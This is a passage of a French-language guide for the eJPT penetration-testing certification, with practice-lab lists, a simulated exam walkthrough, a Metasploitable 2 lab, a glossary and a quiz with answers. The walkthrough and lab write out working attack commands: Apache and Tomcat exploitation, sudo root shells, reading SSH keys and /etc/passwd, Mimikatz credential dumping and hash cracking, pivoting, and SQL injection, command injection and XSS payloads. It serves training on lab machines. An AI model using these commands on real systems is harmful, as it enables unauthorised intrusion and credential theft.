| **Pickle Rick** | TryHackMe | Web/PrivEsc | Exploitation web et élévation de privilèges Linux | Facile |
| **Linux PrivEsc** | TryHackMe | PrivEsc | Techniques d'élévation de privilèges Linux | Moyen |
| **Windows PrivEsc** | TryHackMe | PrivEsc | Techniques d'élévation de privilèges Windows | Moyen |
| **OWASP Top10** | TryHackMe | Web | Vulnérabilités web courantes | Facile-Moyen |
| **Bolt** | TryHackMe | CMS/Exploit | Exploitation d'un CMS vulnérable | Facile |
| **Blue Room** | TryHackMe | Exploit/Cred Dump | Exploitation d'EternalBlue (MS17-010) | Facile |
| **Metasploit Room** | TryHackMe | Exploitation | Maîtrise de Metasploit Framework | Facile |
| **Blue** | Hack The Box | Exploit/Cred Dump | Exploitation d'EternalBlue et extraction d'identifiants | Facile |
| **Legacy** | Hack The Box | Exploit | Exploitation de vulnérabilités Windows anciennes | Facile |
| **Bashed** | Hack The Box | Web/PrivEsc | Webshell et élévation de privilèges Linux | Facile |
| **Shocker** | Hack The Box | Exploit/PrivEsc | Exploitation de Shellshock | Facile |
| **Optimum** | Hack The Box | Exploit/PrivEsc | Exploitation de HFS et élévation de privilèges Windows | Facile |
| **Arctic** | Hack The Box | Exploit/PrivEsc | Exploitation de ColdFusion | Facile |
| **Lame** | Hack The Box | Exploit | Exploitation de Samba | Facile |
| **Jerry** | Hack The Box | Web/Cred Dump | Exploitation de Tomcat avec identifiants par défaut | Très facile |
| **Cronos** | Hack The Box | Web/PrivEsc | Exploitation DNS et tâches planifiées | Moyen |
| **Netmon** | Hack The Box | Enum/Cred Dump | Énumération réseau et extraction d'identifiants | Facile |

### Détails par plateforme

#### TryHackMe

**Intro to Pentesting**  
*Objectif* : Comprendre les bases du test d'intrusion et la méthodologie générale.  
*Flags* : Multiples flags théoriques et pratiques.  
*Temps moyen* : 2-3 heures  
*Score THM* : 4.8/5

**Nmap Room**  
*Objectif* : Maîtriser Nmap pour la découverte d'hôtes et l'énumération de services.  
*Flags* : Flags basés sur les résultats de scans Nmap.  
*Temps moyen* : 1-2 heures  
*Score THM* : 4.7/5

**Vulnversity**  
*Objectif* : Exploiter une application web vulnérable pour obtenir un shell.  
*Flags* : user.txt et root.txt  
*Temps moyen* : 2-3 heures  
*Score THM* : 4.9/5

**Pickle Rick**  
*Objectif* : Exploiter une application web basée sur Rick and Morty pour trouver 3 ingrédients.  
*Flags* : 3 ingrédients cachés sur le serveur.  
*Temps moyen* : 1-2 heures  
*Score THM* : 4.8/5

**Linux PrivEsc**  
*Objectif* : Apprendre diverses techniques d'élévation de privilèges sur Linux.  
*Flags* : Multiples flags pour chaque technique.  
*Temps moyen* : 3-4 heures  
*Score THM* : 4.9/5

#### Hack The Box

**Blue**  
*Objectif* : Exploiter la vulnérabilité EternalBlue (MS17-010) sur un serveur Windows.  
*Flags* : user.txt et root.txt  
*Temps moyen* : 1-2 heures  
*Score HTB* : 4.5/5

**Legacy**  
*Objectif* : Exploiter des vulnérabilités Windows anciennes (SMB).  
*Flags* : user.txt et root.txt  
*Temps moyen* : 1-2 heures  
*Score HTB* : 4.3/5

**Bashed**  
*Objectif* : Exploiter un webshell pour obtenir un accès initial, puis élever les privilèges.  
*Flags* : user.txt et root.txt  
*Temps moyen* : 2-3 heures  
*Score HTB* : 4.4/5

**Lame**  
*Objectif* : Exploiter une vulnérabilité Samba pour obtenir un accès root direct.  
*Flags* : user.txt et root.txt  
*Temps moyen* : 1-2 heures  
*Score HTB* : 4.2/5

### Progression recommandée

**En clair, pour un débutant** : Commencez par les machines faciles de TryHackMe pour apprendre les bases, puis passez aux machines faciles de Hack The Box pour vous confronter à des défis plus réalistes. Cette progression vous permettra d'acquérir les compétences nécessaires pour l'eJPT sans vous décourager.

1. **Débutant total** : Intro to Pentesting → Nmap Room → Metasploit Room
2. **Reconnaissance** : Vulnversity → Blue Room (THM) → Netmon
3. **Exploitation** : Pickle Rick → Blue (HTB) → Legacy → Lame
4. **Élévation de privilèges** : Linux PrivEsc → Windows PrivEsc → Bashed → Optimum
5. **Extraction d'identifiants** : Blue (HTB) → Jerry → Arctic

Cette progression vous permettra de développer méthodiquement vos compétences, en commençant par les bases et en avançant progressivement vers des techniques plus avancées, tout en restant dans le cadre des compétences requises pour l'eJPT.

## 12. Examen simulé complet

Pour vous préparer au mieux à l'eJPT, voici un examen simulé complet qui reproduit les conditions réelles de l'examen. Ce scénario implique trois machines vulnérables et met en pratique toutes les compétences que nous avons abordées jusqu'à présent.

### Scénario

Vous êtes mandaté pour effectuer un test d'intrusion sur le réseau interne d'une entreprise. Vous avez obtenu un accès VPN au réseau cible (10.10.10.0/24) et devez identifier les machines vulnérables, les exploiter, et extraire des informations sensibles.

### Machine 1 : Serveur Web (10.10.10.50)

#### Reconnaissance et énumération

```bash
# Scan initial
sudo nmap -sn 10.10.10.0/24
# Découverte de 10.10.10.50, 10.10.10.100, 10.10.10.150

# Scan détaillé de la première machine
sudo nmap -sS -sV -sC -p- -oA machine1 10.10.10.50

# Résultat du scan
# 22/tcp open  ssh     OpenSSH 7.9p1
# 80/tcp open  http    Apache httpd 2.4.49
```

**Analyse** : Le serveur web utilise Apache 2.4.49, qui est vulnérable à une faille de traversée de répertoire et d'exécution de code à distance (CVE-2021-41773).

#### Exploitation

```bash
# Recherche d'exploits
searchsploit apache 2.4.49
# Résultat : Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution

# Copie de l'exploit
searchsploit -m 50383.py

# Exécution de l'exploit
python3 50383.py http://10.10.10.50
# Résultat : Shell obtenu en tant que www-data
```

**En clair, pour un débutant** : Nous avons trouvé que le serveur web utilise une version vulnérable d'Apache, puis utilisé un exploit public pour obtenir un accès au système.

#### Post-exploitation et élévation de privilèges

```bash
# Vérification des privilèges actuels
whoami  # www-data
id      # uid=33(www-data) gid=33(www-data)

# Recherche de vecteurs d'élévation de privilèges
sudo -l
# Résultat : (ALL : ALL) NOPASSWD: /usr/bin/python3

# Élévation de privilèges
sudo python3 -c 'import os; os.system("/bin/bash")'
# Résultat : Shell root obtenu

# Extraction d'informations
cat /root/flag.txt  # FLAG{web_server_compromised}
cat /etc/passwd     # Liste des utilisateurs
cat /root/.ssh/id_rsa  # Clé SSH privée du root
```

**En clair, pour un débutant** : Après avoir obtenu un accès initial, nous avons découvert que l'utilisateur www-data peut exécuter Python en tant que root sans mot de passe, ce qui nous a permis d'obtenir un accès complet au système.

### Machine 2 : Serveur Windows (10.10.10.100)

#### Reconnaissance et énumération

```bash
# Scan détaillé
sudo nmap -sS -sV -sC -p- -oA machine2 10.10.10.100

# Résultat du scan
# 135/tcp  open  msrpc   Microsoft Windows RPC
# 139/tcp  open  netbios Microsoft Windows netbios-ssn
# 445/tcp  open  smb     Microsoft Windows SMB
# 3389/tcp open  rdp     Microsoft Terminal Services
# 8080/tcp open  http    Apache Tomcat 9.0.30
```

**Analyse** : Le serveur exécute Windows avec SMB et Tomcat 9.0.30 exposé sur le port 8080.

#### Exploitation

```bash
# Énumération SMB
enum4linux-ng -A 10.10.10.100
# Résultat : Partage "Backups" accessible anonymement

# Accès au partage SMB
smbclient //10.10.10.100/Backups -N
smb: \> ls
smb: \> get tomcat-users.xml
smb: \> exit

# Examen du fichier récupéré
cat tomcat-users.xml
# Résultat : Identifiants Tomcat trouvés (admin:P@ssw0rd123)

# Exploitation de Tomcat
msfconsole
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.10.10.100
set RPORT 8080
set HttpUsername admin
set HttpPassword P@ssw0rd123
set LHOST 10.10.14.5
exploit
# Résultat : Shell Meterpreter obtenu
```

**En clair, pour un débutant** : Nous avons trouvé un partage de fichiers accessible sans mot de passe, qui contenait des identifiants pour le serveur web Tomcat. Nous avons ensuite utilisé ces identifiants pour déployer notre code malveillant via l'interface d'administration de Tomcat.

#### Post-exploitation et extraction d'identifiants

```bash
# Dans Meterpreter
getuid  # NT AUTHORITY\SYSTEM (déjà privilégié)

# Extraction des hachages NTLM
load kiwi
creds_all
# Résultat : Hachage NTLM de l'administrateur obtenu
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# Sauvegarde du hachage pour cracking
echo "Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::" > hash.txt

# Cracking du hachage avec hashcat
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
# Résultat : Password123
```

**En clair, pour un débutant** : Nous avons extrait l'empreinte du mot de passe administrateur de la mémoire de Windows, puis utilisé un outil pour retrouver le mot de passe en clair à partir de cette empreinte.

### Machine 3 : Serveur interne (10.10.10.150)

#### Pivotement et reconnaissance

```bash
# Configuration du pivotement via la machine Windows
meterpreter > run autoroute -s 10.10.20.0/24
meterpreter > background

# Scan du réseau interne via le pivot
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.20.15
msf > set PORTS 22,80,445
msf > run
# Résultat : Machine interne 10.10.20.15 avec ports 22 et 80 ouverts

# Configuration d'un proxy SOCKS
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 9050
msf > run

# Configuration de proxychains
echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf

# Scan via le proxy
proxychains nmap -sT -sV -p 22,80 10.10.20.15
# Résultat : SSH et serveur web Apache
```

**En clair, pour un débutant** : Nous avons utilisé la machine Windows compromise comme un pont pour accéder à un réseau interne normalement inaccessible, puis scanné ce réseau pour trouver de nouvelles cibles.

#### Exploitation finale

```bash
# Tentative de connexion SSH avec les identifiants crackés
proxychains ssh administrator@10.10.20.15
# Échec : Mauvais identifiants

# Énumération web
proxychains curl http://10.10.20.15
# Résultat : Page de login pour un système de gestion interne

# Test d'injection SQL
proxychains sqlmap -u "http://10.10.20.15/login.php" --forms --dump
# Résultat : Base de données d'utilisateurs extraite avec hachages MD5

# Cracking des hachages MD5
echo "5f4dcc3b5aa765d61d8327deb882cf99" > md5hash.txt
hashcat -m 0 md5hash.txt /usr/share/wordlists/rockyou.txt
# Résultat : "password"

# Connexion SSH avec les nouveaux identifiants
proxychains ssh admin@10.10.20.15
# Mot de passe : password
# Résultat : Accès obtenu

# Capture du flag final
cat /home/admin/final_flag.txt
# FLAG{network_pivoting_master}
```

**En clair, pour un débutant** : Nous avons découvert une application web vulnérable sur le serveur interne, extrait sa base de données d'utilisateurs, puis utilisé les identifiants obtenus pour nous connecter directement au serveur et récupérer le flag final.

### Conclusion de l'examen simulé

Ce scénario complet vous a permis de mettre en pratique :
1. La reconnaissance et l'énumération de réseau
2. L'exploitation de vulnérabilités web
3. L'élévation de privilèges
4. L'extraction et le cracking d'identifiants
5. Le pivotement réseau
6. L'exploitation d'injections SQL

Ces compétences sont exactement celles qui seront évaluées lors de l'examen eJPT réel. En maîtrisant ce scénario, vous serez bien préparé pour réussir l'examen.

## 13. Mini-lab récapitulatif : Metasploitable 2

Metasploitable 2 est une machine virtuelle Linux délibérément vulnérable, conçue pour la formation à la sécurité. C'est un excellent environnement pour pratiquer les compétences nécessaires à l'eJPT. Voici un mini-lab de 90 minutes qui vous permettra de mettre en pratique tout ce que nous avons vu jusqu'à présent.

### Configuration

1. Téléchargez Metasploitable 2 depuis [SourceForge](https://sourceforge.net/projects/metasploitable/)
2. Importez l'image dans VMware ou VirtualBox
3. Configurez le réseau en mode "Host-only" ou "NAT" pour isoler la machine
4. Démarrez Metasploitable 2 et notez son adresse IP (généralement affichée à l'écran de connexion)

**En clair, pour un débutant** : Metasploitable 2 est comme un terrain d'entraînement rempli de cibles faciles. Vous l'installez dans une machine virtuelle isolée pour pouvoir pratiquer sans danger.

### Phase 1 : Reconnaissance (15 minutes)

```bash
# Scan complet
sudo nmap -sS -sV -O -p- -T4 <IP_METASPLOITABLE>

# Résultats typiques (partiels)
# 21/tcp   open  ftp         vsftpd 2.3.4
# 22/tcp   open  ssh         OpenSSH 4.7p1
# 23/tcp   open  telnet      Linux telnetd
# 25/tcp   open  smtp        Postfix smtpd
# 80/tcp   open  http        Apache httpd 2.2.8
# 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
# 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
# 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
# 5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
# 8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
```

**En clair, pour un débutant** : Cette étape vous permet d'identifier tous les services vulnérables sur la machine. Metasploitable 2 en contient beaucoup, c'est comme un catalogue de failles de sécurité.

### Phase 2 : Exploitation des services (45 minutes)

#### Exploitation de vsftpd 2.3.4

```bash
# Dans Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <IP_METASPLOITABLE>
exploit
# Résultat : Shell root obtenu
```

**En clair, pour un débutant** : Cette version de FTP contient une backdoor (porte dérobée) intentionnelle qui nous donne directement un accès administrateur.

#### Exploitation de Samba

```bash
# Dans Metasploit
use exploit/multi/samba/usermap_script
set RHOSTS <IP_METASPLOITABLE>
exploit
# Résultat : Shell root obtenu
```

**En clair, pour un débutant** : Samba (le système de partage de fichiers) contient une faille qui nous permet d'exécuter des commandes en tant qu'administrateur.

#### Exploitation de Tomcat

```bash
# Tentative de connexion avec identifiants par défaut
# Ouvrir dans le navigateur : http://<IP_METASPLOITABLE>:8180/manager/html
# Essayer les identifiants : tomcat:tomcat

# Dans Metasploit
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS <IP_METASPLOITABLE>
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
exploit
# Résultat : Shell obtenu
```

**En clair, pour un débutant** : Tomcat est configuré avec des identifiants par défaut, ce qui nous permet d'y déployer notre propre code malveillant.

#### Exploitation de MySQL

```bash
# Connexion à MySQL avec mot de passe vide
mysql -h <IP_METASPLOITABLE> -u root -p
# Appuyer sur Entrée au prompt de mot de passe

# Dans MySQL
show databases;
use mysql;
select user, password from user;
# Résultat : Liste des utilisateurs et hachages de mots de passe
```

**En clair, pour un débutant** : La base de données MySQL est accessible sans mot de passe, ce qui nous permet d'extraire directement les informations sensibles qu'elle contient.

### Phase 3 : Exploitation web (30 minutes)

#### DVWA (Damn Vulnerable Web Application)

Accédez à http://<IP_METASPLOITABLE>/dvwa/ et connectez-vous avec admin:password

```bash
# Injection SQL
# Dans la page "SQL Injection", entrer : ' OR '1'='1
# Résultat : Tous les utilisateurs affichés

# Exécution de commandes
# Dans la page "Command Execution", entrer : 127.0.0.1; cat /etc/passwd
# Résultat : Contenu du fichier passwd affiché
```

**En clair, pour un débutant** : DVWA est une application web intentionnellement vulnérable qui vous permet de pratiquer différentes techniques d'attaque web comme l'injection SQL et l'exécution de commandes.

#### Mutillidae

Accédez à http://<IP_METASPLOITABLE>/mutillidae/

```bash
# Injection XSS
# Dans la page de recherche, entrer : <script>alert('XSS')</script>
# Résultat : Alerte JavaScript affichée

# Injection SQL
# Dans la page de login, entrer : ' OR '1'='1' -- 
# Résultat : Connexion réussie en tant qu'admin
```

**En clair, pour un débutant** : Mutillidae est une autre application web vulnérable qui vous permet de pratiquer d'autres types d'attaques comme le Cross-Site Scripting (XSS).

### Solution complète (spoiler)

Metasploitable 2 contient de nombreuses vulnérabilités intentionnelles, dont :

1. vsftpd 2.3.4 avec backdoor
2. Samba avec vulnérabilité usermap_script
3. Tomcat avec identifiants par défaut (tomcat:tomcat)
4. MySQL avec mot de passe root vide
5. Applications web vulnérables (DVWA, Mutillidae)
6. Serveur Distcc vulnérable
7. UnrealIRCd avec backdoor
8. Serveur NFS mal configuré

Chacune de ces vulnérabilités peut être exploitée pour obtenir un accès au système, ce qui en fait un excellent environnement d'entraînement pour l'eJPT.

**En clair, pour un débutant** : Metasploitable 2 est comme un parcours d'obstacles de sécurité où chaque service présente une faille différente. En les exploitant toutes, vous pratiquez l'ensemble des compétences nécessaires pour l'eJPT.

## 14. Glossaire (20 termes)

Voici un glossaire des 20 termes essentiels que vous devez connaître pour l'eJPT :

**1. Pentest (Test d'intrusion)**  
Processus d'évaluation de la sécurité d'un système informatique en simulant des attaques contrôlées pour identifier les vulnérabilités.

**En clair, pour un débutant** : C'est comme engager un cambrioleur professionnel pour tester la sécurité de votre maison et vous dire où sont les faiblesses.

**2. Reconnaissance (Recon)**  
Phase initiale d'un test d'intrusion consistant à collecter des informations sur la cible sans interagir directement avec elle.

**En clair, pour un débutant** : C'est l'équivalent d'observer une maison de loin pour repérer les entrées, les caméras et les habitudes des occupants.

**3. Énumération (Enumeration)**  
Processus de collecte d'informations détaillées sur les systèmes cibles, comme les services, les versions et les utilisateurs.

**En clair, pour un débutant** : C'est comme faire l'inventaire précis de toutes les portes et fenêtres d'un bâtiment, en notant leur type et leur état.

**4. Exploitation**  
Utilisation d'une vulnérabilité pour obtenir un accès non autorisé à un système.

**En clair, pour un débutant** : C'est l'action d'utiliser une faiblesse identifiée pour entrer dans le système, comme utiliser une porte mal verrouillée.

**5. Payload**  
Code malveillant envoyé à un système vulnérable pour exécuter des actions non autorisées.

**En clair, pour un débutant** : C'est l'outil que vous introduisez une fois la porte ouverte, comme un petit robot qui va explorer les lieux pour vous.

**6. Shell**  
Interface permettant d'exécuter des commandes sur un système compromis.

**En clair, pour un débutant** : C'est votre "télécommande" pour contrôler l'ordinateur piraté à distance.

**7. Élévation de privilèges (Privilege Escalation)**  
Processus d'obtention de droits d'accès plus élevés sur un système déjà compromis.

**En clair, pour un débutant** : C'est comme passer d'une simple clé d'entrée à un passe-partout qui ouvre toutes les portes du bâtiment.

**8. Pivoting**  
Technique utilisant un système compromis comme point de rebond pour attaquer d'autres systèmes.

**En clair, pour un débutant** : C'est comme utiliser un premier appartement conquis pour accéder aux autres appartements de l'immeuble normalement inaccessibles depuis l'extérieur.

**9. Persistance**  
Mécanisme permettant de maintenir l'accès à un système compromis même après un redémarrage.

**En clair, pour un débutant** : C'est comme installer une porte dérobée invisible qui reste accessible même si les propriétaires changent les serrures principales.

**10. Exfiltration de données**  
Processus de copie et de transfert non autorisé de données depuis un système compromis.

**En clair, pour un débutant** : C'est l'action de copier des documents confidentiels et de les sortir discrètement du bâtiment.

**11. Hachage (Hash)**  
Empreinte numérique unique générée à partir d'une donnée, souvent utilisée pour stocker les mots de passe.

**En clair, pour un débutant** : C'est comme une empreinte digitale unique pour un mot de passe, qui ne permet pas de retrouver le mot de passe original mais de le vérifier.

**12. Cracking**  
Processus de récupération d'un mot de passe en clair à partir de son hachage.

**En clair, pour un débutant** : C'est comme essayer des milliers de clés différentes jusqu'à trouver celle qui correspond à une serrure spécifique.

**13. Injection SQL**  
Vulnérabilité permettant d'insérer des commandes SQL malveillantes dans une application web.

**En clair, pour un débutant** : C'est comme glisser une fausse instruction dans une liste de courses pour que l'épicier vous donne accès à sa réserve.

**14. Cross-Site Scripting (XSS)**  
Vulnérabilité permettant d'injecter du code JavaScript malveillant dans une page web.

**En clair, pour un débutant** : C'est comme placer un espion invisible sur un site web qui affectera tous les visiteurs de ce site.

**15. Man-in-the-Middle (MitM)**  
Attaque où l'attaquant s'intercale entre deux parties communicantes pour intercepter ou modifier les échanges.

**En clair, pour un débutant** : C'est comme intercepter le courrier entre deux personnes, le lire, et parfois le modifier avant de le transmettre.

**16. Reverse Shell**  
Connexion initiée depuis la machine cible vers l'attaquant, permettant l'exécution de commandes à distance.

**En clair, pour un débutant** : C'est comme si, au lieu d'appeler quelqu'un, vous le faites vous appeler pour lui donner des instructions sans laisser votre numéro.

**17. Bind Shell**  
Service malveillant sur la machine cible qui attend une connexion de l'attaquant.

**En clair, pour un débutant** : C'est comme installer un interphone secret sur un bâtiment, que seul vous pouvez utiliser pour donner des ordres à l'intérieur.

**18. Port Scanning**  
Technique pour identifier les ports ouverts sur un système cible.

**En clair, pour un débutant** : C'est comme vérifier chaque porte et fenêtre d'un bâtiment pour voir lesquelles sont ouvertes ou déverrouillées.

**19. Social Engineering**  
Manipulation psychologique visant à inciter des personnes à divulguer des informations confidentielles ou à effectuer des actions spécifiques.

**En clair, pour un débutant** : C'est l'art de convaincre quelqu'un de vous donner les clés de sa maison en lui faisant croire que vous êtes un plombier légitime.

**20. Footprinting**  
Processus de collecte d'informations sur une organisation cible, ses systèmes et son infrastructure.

**En clair, pour un débutant** : C'est comme étudier les plans d'un bâtiment, ses horaires d'ouverture et ses mesures de sécurité avant de planifier une intrusion.

## 15. Quiz final (10 QCM + corrigé)

Testez vos connaissances avec ce quiz de 10 questions à choix multiples. Les réponses sont fournies à la fin.

### Questions

**1. Quelle commande permet de scanner tous les ports d'une machine cible avec détection de version ?**
   - A) `nmap -sS 10.10.10.15`
   - B) `nmap -sV -p- 10.10.10.15`
   - C) `nmap -sn 10.10.10.0/24`
   - D) `nmap -O 10.10.10.15`

**2. Comment initialise-t-on la base de données de Metasploit ?**
   - A) `msfdb start`
   - B) `msfconsole -q`
   - C) `msfdb init`
   - D) `service postgresql start`

**3. Quelle commande permet d'extraire les identifiants Windows dans Meterpreter ?**
   - A) `hashdump`
   - B) `load kiwi && creds_all`
   - C) `run post/windows/gather/credentials`
   - D) `getuid`

**4. Quelle technique permet d'accéder à un réseau interne via une machine compromise ?**
   - A) Port forwarding
   - B) Pivoting
   - C) Tunneling
   - D) Toutes les réponses ci-dessus

**5. Quelle commande recherche les fichiers SUID sur un système Linux ?**
   - A) `find / -perm -4000 -type f 2>/dev/null`
   - B) `sudo -l`
   - C) `cat /etc/passwd`
   - D) `ls -la /root`

**6. Quel outil est utilisé pour tester les injections SQL sur une application web ?**
   - A) Nikto
   - B) Gobuster
   - C) SQLmap
   - D) Hydra

**7. Quelle est la première étape d'un test d'intrusion ?**
   - A) Exploitation
   - B) Reconnaissance
   - C) Élévation de privilèges
   - D) Énumération

**8. Quel type d'attaque consiste à intercepter le trafic entre deux parties ?**
   - A) DDoS
   - B) Man-in-the-Middle
   - C) Brute Force
   - D) Cross-Site Scripting

**9. Quel est le seuil de réussite pour l'examen eJPT ?**
   - A) 60%
   - B) 65%
   - C) 70%
   - D) 75%

**10. Quelle commande permet d'énumérer les partages SMB sur une machine Windows ?**
    - A) `smbclient -L //10.10.10.15/`
    - B) `enum4linux -a 10.10.10.15`
    - C) `nmap -p 445 10.10.10.15`
    - D) `hydra -l admin -P rockyou.txt smb://10.10.10.15`

### Corrigé

**1. B) `nmap -sV -p- 10.10.10.15`**  
Cette commande effectue un scan de tous les ports (-p-) avec détection de version (-sV).

**En clair, pour un débutant** : Cette commande examine tous les points d'entrée possibles d'un ordinateur et identifie précisément quels services y tournent.

**2. C) `msfdb init`**  
Cette commande initialise la base de données de Metasploit, nécessaire pour stocker les résultats des scans.

**En clair, pour un débutant** : Cette commande prépare le "carnet d'adresses" que Metasploit utilisera pour organiser ses informations.

**3. B) `load kiwi && creds_all`**  
Cette séquence charge l'extension Mimikatz (Kiwi) dans Meterpreter et extrait tous les identifiants.

**En clair, pour un débutant** : Ces commandes activent un outil spécial qui peut récupérer les mots de passe stockés dans la mémoire de Windows.

**4. D) Toutes les réponses ci-dessus**  
Le port forwarding, le pivoting et le tunneling sont toutes des techniques permettant d'accéder à des réseaux internes.

**En clair, pour un débutant** : Ces techniques permettent d'utiliser un ordinateur compromis comme un pont pour atteindre d'autres ordinateurs normalement inaccessibles.

**5. A) `find / -perm -4000 -type f 2>/dev/null`**  
Cette commande recherche les fichiers avec le bit SUID activé, souvent utilisés pour l'élévation de privilèges.

**En clair, pour un débutant** : Cette commande cherche des programmes spéciaux qui peuvent être exécutés avec les droits de leur propriétaire, souvent utilisés pour devenir administrateur.

**6. C) SQLmap**  
SQLmap est un outil spécialisé pour tester les injections SQL sur les applications web.

**En clair, pour un débutant** : Cet outil teste automatiquement si un site web est vulnérable aux injections SQL, une faille permettant de manipuler sa base de données.

**7. B) Reconnaissance**  
La reconnaissance est la première étape d'un test d'intrusion, consistant à collecter des informations sur la cible.

**En clair, pour un débutant** : Avant toute tentative d'intrusion, il faut d'abord observer et comprendre la cible, comme un repérage avant une mission.

**8. B) Man-in-the-Middle**  
Une attaque Man-in-the-Middle consiste à s'intercaler entre deux parties pour intercepter ou modifier leurs communications.

**En clair, pour un débutant** : C'est comme intercepter le courrier entre deux personnes, le lire, et parfois le modifier avant de le transmettre.

**9. C) 70%**  
Le seuil de réussite pour l'examen eJPT est de 70 points sur 100.

**En clair, pour un débutant** : Vous devez obtenir au moins 70% des points disponibles pour réussir l'examen eJPT.

**10. B) `enum4linux -a 10.10.10.15`**  
enum4linux est un outil qui effectue une énumération complète des services Windows/Samba.

**En clair, pour un débutant** : Cet outil explore en profondeur un ordinateur Windows pour découvrir ses dossiers partagés, utilisateurs et autres informations utiles.
